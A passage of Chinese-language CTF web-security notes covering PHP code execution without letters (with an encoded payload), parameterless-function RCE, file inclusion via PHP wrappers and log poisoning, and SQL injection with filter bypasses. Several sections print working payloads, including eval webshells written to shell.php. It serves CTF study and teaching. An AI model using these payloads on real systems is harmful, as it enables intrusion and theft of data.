> 第二个点是自增，因为有了个C，可以从`C++ => D`而获得所有字母A-Z；
>
> > 摘自官方文档：
> >
> > 在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 `$a = 'Z'; $a++;` 将把 `$a` 变成`'AA'`，而在 C 中，`a = 'Z'; a++;` 将把 `a` 变成 `'['`（`'Z'` 的 ASCII 值是 90，`'['` 的 ASCII 值是 91）。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。
>
> 这里直接用disable的漏网之鱼`passthru`进行命令执行
>
> payload：用的时候要把注释内容删去，并且进行url编码
>
> ```php
> $_=<<<_
> C
> _;
> $__=<<<C
> _
> C;
> 
> $_++;$_++;
> $_++;$_++;
> $_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$___=$_[1]; // A
> 
> $_0=$___; // a
> $___++;$_1=$___; // b
> $___++;$_2=$___; // c
> $___++;$_3=$___; // d
> $___++;$__1=$___; // e
> $___++;$__2=$___; // f
> $___++;$__3=$___; // g
> $___++;$___1=$___; // h
> $___++;$___2=$___; // i
> $___++;$___3=$___; // j
> $___++;$____1=$___; // k
> $___++;$____2=$___; // l
> $___++;$____3=$___; // m
> $___++;$_____1=$___; // n
> $___++;$_____2=$___; // o
> $___++;$_____3=$___; // p
> $___++;$______1=$___; // q
> $___++;$______2=$___; // r
> $___++;$______3=$___; // s
> $___++;$_______1=$___; // t
> $___++;$_______2=$___; // u
> $___++;$_______3=$___; // v
> $___++;$________1=$___; // w
> $___++;$________2=$___; // x
> $___++;$________3=$___; // y
> $___++;$_________1=$___; // z
> 
> $_01=$_____3.$_0.$______3.$______3.$_______1.$___1.$______2.$_______2;//passthru
> $_02=$__.$_____3.$_____2.$______3.$_______1; //_post
> $__=$$_02;
> $_01($__[_]);
> ```
>
> post的表单数据：
>
> ```
> ctf_show=
> %24_%3D%3C%3C%3C_%0AC%0A_%3B%0A%24__%3D%3C%3C%3CC%0A_%0AC%3B%0A%0A%24_%2B%2B%3B%24_%2B%2B%3B%0A%24_%2B%2B%3B%24_%2B%2B%3B%0A%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%5B1%5D%3B%20%0A%0A%24_0%3D%24___%3B%20%0A%24___%2B%2B%3B%24_1%3D%24___%3B%20%0A%24___%2B%2B%3B%24_2%3D%24___%3B%20%0A%24___%2B%2B%3B%24_3%3D%24___%3B%20%0A%24___%2B%2B%3B%24__1%3D%24___%3B%20%0A%24___%2B%2B%3B%24__2%3D%24___%3B%20%0A%24___%2B%2B%3B%24__3%3D%24___%3B%20%0A%24___%2B%2B%3B%24___1%3D%24___%3B%20%0A%24___%2B%2B%3B%24___2%3D%24___%3B%20%0A%24___%2B%2B%3B%24___3%3D%24___%3B%20%0A%24___%2B%2B%3B%24____1%3D%24___%3B%20%0A%24___%2B%2B%3B%24____2%3D%24___%3B%20%0A%24___%2B%2B%3B%24____3%3D%24___%3B%20%0A%24___%2B%2B%3B%24_____1%3D%24___%3B%20%0A%24___%2B%2B%3B%24_____2%3D%24___%3B%20%0A%24___%2B%2B%3B%24_____3%3D%24___%3B%20%0A%24___%2B%2B%3B%24______1%3D%24___%3B%20%0A%24___%2B%2B%3B%24______2%3D%24___%3B%20%0A%24___%2B%2B%3B%24______3%3D%24___%3B%20%0A%24___%2B%2B%3B%24_______1%3D%24___%3B%20%0A%24___%2B%2B%3B%24_______2%3D%24___%3B%20%0A%24___%2B%2B%3B%24_______3%3D%24___%3B%20%0A%24___%2B%2B%3B%24________1%3D%24___%3B%20%0A%24___%2B%2B%3B%24________2%3D%24___%3B%0A%24___%2B%2B%3B%24________3%3D%24___%3B%0A%24___%2B%2B%3B%24_________1%3D%24___%3B%0A%0A%24_01%3D%24_____3.%24_0.%24______3.%24______3.%24_______1.%24___1.%24______2.%24_______2%3B%0A%24_02%3D%24__.%24_____3.%24_____2.%24______3.%24_______1%3B%0A%24__%3D%24%24_02%3B%0A%24_01(%24__%5B_%5D)%3B
> &_=cat /flag.txt
> ```
>
> #### 一点小补充：
>
> 在写payload的时候，本来是打算使用assert或者eval的
>
> > assert把整个字符串参数当php代码执行，eval把合法的php代码执行
>
> 在PHP7.1版本以后， assert()默认不再可以执行代码
> (assert在更新后无法将使用字符串作为参数，而GET或POST传入的数据默认就是字符串类型）
>
> 我们都知道eval相当于将字符串拼接到原来的代码中，正常来说把assert换成eval就可以了
>
> 但这里会报错Call to undefined function EVAL()
>
> 经过查询知道：
>
> > eval是语言构造器而不是一个函数，不能被可变函数调用
> >
> > 可变函数即变量名加括号，PHP系统会尝试解析成函数，如果有当前变量中的值为命名的函数，就会调用。如果没有就报错。
> > ·
> > 可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require eval() 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数
>
> 参考：
> [动态调用函数时的命令执行对于eval()和assert()的执行问题_Alexhirchi的博客-CSDN博客](https://blog.csdn.net/weixin_43669045/article/details/107093451)





#### 无参数函数rce

以下部分摘自：[PHP Parametric Function RCE · sky's blog (skysec.top)](https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/)



就是无参数0-0，像`/[^\W]+\((?R)?\)/`这样的正则
禁：a('123')这样的类型，只能是构造a(b(c()))这样的形式进行rce



可以用全局变量搭配一些函数取得字母进行rce

取全局变量：

1. getenv()

2. localeconv()

3. getallheaders()：apache2环境

4. get_defined_vars()：回显全局变量：`$_GET`、`$_POST`、`$_FILES`、`$_COOKIE`

5. session_id()：获取/设置当前会话id
   session_start()：创建新会话或重用现会话。 
   如果通过 GET 、POST 或者用 cookie 提交了会话 ID， 则会重用现有会话

   ```
   利用eval(hex2bin(session_id(session_start())));
   然后传入cookie:PHPSESSID=payloadpayload=转为十六进制的"命令"
   ```
   
6. getcwd()：获取当前目录
   chdir()：更改当前目录
   dirname()：返回路径中的目录部分

一些函数：

1. scandir(目录,[0|1:升|降序],[context])——列出指定路径中的文件和目录
2. localeconv()——返回一包含本地数字及货币格式信息的数组,数组第一项是.
3. current()——返回数组中的当前元素值, 默认取第一个值，别名为pos()
4. array_reverse()——逆向输出数组
5. array_flip()交换数组的键和值
6. array_rand()从数组随机一个或多个单元，不断刷新访问就会不断随机返回



##### GXYCTF禁止套娃

[简析GXY_CTF “禁止套娃”无参数RCE – 颖奇L'Amore (gem-love.com)](https://www.gem-love.com/ctf/530.html)

方法1：找flag.php再

 payload:

```
show_source(next(array_reverse(scandir(pos(localeconv()))))); highlight_file(next(array_reverse(scandir(current(localeconv()))))); highlight_file(array_rand(array_flip(scandir(current(localeconv()))))); highlight_file(next(array_reverse(scandir(current(localeconv())))));
```

 方法2、

```
eval(arrar_pop(next(get_defined_vars()))); +post传参 
```



#### Linux系统变量剪裁构造

##### CTFSHOW 118

ban了很多指令，只能使用系统变量如：$PATH、$IFS等等
 但输出被禁用了，只能使用剪裁(切片)来构造指令输出flag

 如下为系统环境变量
 ![](https://i.loli.net/2021/09/22/XM3c9n4Plw67QaS.gif)

用`bin的n`和`html的l`构造`nl`：`${PATH:~A}${PWD:~A}`
 (~取反表示从最后面开始数，a相当于0)

 最终payload:

```
${PATH:~A}${PWD:~A}$IFS????.??? == nl flag.php
```



## 文件包含

服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行

**PHP文件包含函数**：

1. include：
   - 包含并运行指定文件，在包含过程中出错会报错，**不影响**执行后续语句
2. include_once：
   - 仅包含一次文件。会检查文件是否被包含过，若已被包含则不会再次包含
3. require：
   - 在包含过程中出错，就会直接退出，**不执行**后续语句
4. require_once：
   - 和 require 完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含



### 伪协议的妙用

- 伪协议的运用：[伪协议的学习](https://na0h.cn/2021/02/25/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/)、[PHP: 支持的协议和封装协议](https://www.php.net/manual/zh/wrappers.php)

  - 过滤器filter://读文件：`?file=php://filter/convert.base64-encode/resource=flag.php`

  - data://：
    某些字符串被过滤，可以使用data协议编码后传入
    如：php被替换为???，那么可以传入

    ```
    data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs
    ```

    > 例 ctfshow web87
    >
    > ![](https://i.loli.net/2021/09/23/nyPzASEuMIp4Wo6.png)
    >
    > 1. convert.base64-deconde
    >
    >    ```
    >    ?file=php://filter/write=convert.base64-decode/resource=shell.phpcontent=abPD9waHAgQGV2YWwoJF9SRVFVRVNUWzFdKT8+
    >    ```
    >
    > 
    >
    > 2. rot13
    >
    >    ```
    >    ?file=php://filter/write=string.rot13/resource=shell.php(要进行两次url全编码)
    >    content=<?php system(‘tac flag.php’);?>	（rot13）
    >    ```
    >
    > 
    >
    > 3. 或者是filter协议写入
    >
    >    ```
    >    ?file=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php(要进行两次url全编码)
    >    content=<?php @eval($_REQUEST[1]);?>  （base64编码）
    >    ```



### 日志包含拿shell

一些日志文件默认路径：

1. nginx日志文件：/var/log/nginx/access.log
2. apache日志文件：/var/log/ apache | apache2 | httpd /access.log
3. iis日志文件：%systemroot%\system32\logfiles\

下面用的是nginx的日志文件路径：/var/log/nginx/access.log

```php
在ua头写一句话，再传参包含即可
user_agent：<?php eval($_post[1]);?>
然后：
include($_GET[1]);&1=/var/log/nginx/access.log
```

**ps：**

1. **日志包含尽量一次成功，不然错误代码会影响后面代码解析**
   **可以事先在本地试一下再传**

2. **在Ua中传入不会进行解码，因此编码绕过是无效的**
   **而在url中写入则会被url编码，没到达php就会被写入日志文件，同样不行**



### session.upload_progress

[利用session.upload_progress进行文件包含和反序列化渗透 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/202819.html)

利用条件：

1. 存在文件包含漏洞 or session反序列化漏洞
2. 知道session文件存放路径，可以尝试默认路径
3. 具有读取和写入session文件的权限

由于php.ini默认配置的关系

1. `session.use_strict_mode默认值为0`，
   此时用户可以自己定义Session ID
   如：设置cookie：`PHPSESSID=hhh`，那么PHP会在服务器上创建一个文件：`/tmp/sess_hhh`

   > 即使此时用户没有初始化Session，PHP也会自动初始化Session。
   >  并产生一个键值，这个键值由ini.get("session.upload_progress.prefix")+由我们构造的session.upload_progress.name值组成，
   > 最后被写入sess_文件里
   
2. `session.upload_progress.cleanup = on`
   会导致文件上传后，session文件内容立即清空
   可以利用条件竞争，在session内容被清空前进行包含

   



### 协议绕过

> `allow_url_fopen` 和 `allow_url_include` 主要是针对 `http` `ftp` 两种协议起作用，
> 因此可以使用SMB、WebDav协议等方式来绕过限制。



### 利用ssrf读取文件

[php curl实现发送get和post请求 - 简书 (jianshu.com)](https://www.jianshu.com/p/7fab00c11770)





## sql注入

### 一些小知识点

- 可以利用@@xxx来搜索全局变量|配置参数
  像@@datadir、@@version等等
  
- 运算优先级：`and>or`

  > eg: ctfshow 181
  > payload：`'or(username='flag')or'0`
  >
  > 拼接到注入语句相当于`username !='flag' and id ='' or(username='flag')or'0'`
  > 这里先执行and语句，因为`id=''`，and结果为0，再执行or语句，最终where的条件为(username=’flag’)

- union联合查询 (可以做一下[GXYCTF2019]BabySQli)
  在联合查询时
  若查找的数据不存在，联合查询就会构造一个虚拟的数据![](https://i.loli.net/2021/09/28/n81iAVBDRuTIJre.png)



### 注释符

- sql中的注释符：`-- (空格)`、`#`、`/* */`

  - url中在末端传入的空格会被忽略，其余则被转义为%20
    故常使用`--+`，+会被浏览器解释为空格
  - `#`在浏览器中作为锚点，需要传入转义后的`%23`

- 内联注释`/*！code */`
  内联注释可用于整个sql语句中，执行sql注入
  会将`/*！code */`中的`code`注释，但仍执行其代表的命令

  ```sql
  index.php?id=1 /! UNION/ /! SELECT/ 1,2,3
  ```

- 实际上，只要确保语句正常返回即可，注释或者构造闭合都一样
  像单引号：
  （万能密码也是一样的道理，使得where处为真即可）

  ```sql
  1' union select 1,password,3 from ctfshow_user #
  
  1' union select 1,password,3 from ctfshow_user where 'a'='a
  ```
  



具体可以看本人早期写的：[sql注入的一些基操 - Na0H](https://na0h.cn/2020/12/30/sql注入的一些基操/)
但当时有些东西理解不深，可能存在一些问题，看到的师傅还请不吝指正



### 基本流程

- 找注入点如：

  - GET/POST/PUT/DELETE参数
  - X-Forwarded-For
  - 文件名

- 判断闭合方式像：数字型、单双引号、括号等等

- 然后判断字段数、回显位

  ```sql
  1’ order by 1--+
  1’ union select 1,2,3 –+
  ```

- 然后库、表、字段、数据

  ```sql
  select schema_name from information_schema.schemata
  select table_name from information_schema.tables where table_schema=’xxx’
  select column_name from information_schema.columns where table_name=’xxx’
  select group_concat(xxx) from xxx
  ```



### 过滤绕过

  - 过滤关键字
    `bypass`：

    - `大小写`绕过（适用：过滤方式对`大小写敏感`）
    - `双写`绕过（适用：过滤方式为`将关键字替换为空`）
    - `编码`绕过
    - `内联注释`绕过（`/*！code */`）

  - 过滤特殊符号

    - 过滤`空格`

      ```
      /**/
      ()
      反引号``
      %0d(回车)
      %09(tab水平制表符)
      %0a(换行)
      %0c(换页)
      %0b(垂直制表符)
      %a0
      ```

    - 过滤`注释符`

      ```
      可用注释符：
      --+
      --%0c-
      以上实际都是-- (空格)，只是%0c和+都被url解释为空格
      %23(#)
      ```

    - 过滤`逻辑符`

      ```
      and = &&
      or = ||
      xor = | # 异或
      not = !
      ```

    - 其他过滤

      - 过滤`=`
        - 不加通配符`%`的`like`和`relike`![](https://i.loli.net/2021/09/28/q4kovDAprYgEf3G.png)
        - `!<>`
          （`<>`相当于`!=`，所以`!<>`就相当于`=`）
        - 利用关键字regexp进行正则表达匹配
        - 利用比较函数strcmp(str1,str2)
      - 过滤逗号，引号等等![](https://i.loli.net/2021/09/28/OarVTJnZNqCEK2y.png)

      

  - 过滤`返回值`，要求返回值不得存在如username=admin
    bypass：

    - 只输出admin的password

      ```sql
      ' union select 1,password from user where username='admin'--+
      ```

    - 用`hex()`、`to_base64()`这样的函数将字段内容加密再输出

      ```sql
      ' union select id,to_base64(username),hex(password) from user--+
      ```

  - 过滤了数字和一些关键字flag（ctfshow 174）
    `preg_match('/flag|[0-9]/i', json_encode($ret)`

    - 利用replace函数，将数字0-9替换
      （可以写脚本把payload跑出来）

      ```python
      num = {0: "na", 1: "nb", 2: "nc", 3: "nd", 4: "ne", 5: "nf", 6: "ng", 7: "nh", 8: "ni", 9: "nj"}
      password = "password"
      for i in range(0, 10):
          password = f"replace({password},'{i}','{num[i]}')"
          print(password)
          
      # 运行得到：replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'0','na'),'1','nb'),'2','nc'),'3','nd'),'4','ne'),'5','nf'),'6','ng'),'7','nh'),'8','ni'),'9','nj')
      ```

      再拼到注入语句中：

      ```sql
      ' union select username,password from ctfshow_user4 where username='flag' --+
      
      拼接后：
      
      ' union select reverse(username),
      replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'0','na'),'1','nb'),'2','nc'),'3','nd'),'4','ne'),'5','nf'),'6','ng'),'7','nh'),'8','ni'),'9','nj')
      from ctfshow_user4 where username='flag' --+
      ```

      得到结果后再用脚本替换回来

      ```python
      flag = "ctfshow{bneeaenhnini-nhnieni-nengnfni-bnfnanj-nhabdnfnaningencbnf}"
      num = {0: "na", 1: "nb", 2: "nc", 3: "nd", 4: "ne", 5: "nf", 6: "ng", 7: "nh", 8: "ni", 9: "nj"}
      for i in range(0, 10):
          flag = flag.replace(str(num[i]), str(i))
      print(flag)
      
      # 得到ctfshow{b4eae788-78e8-4658-b509-7abd5086e2b5}
      ```

      

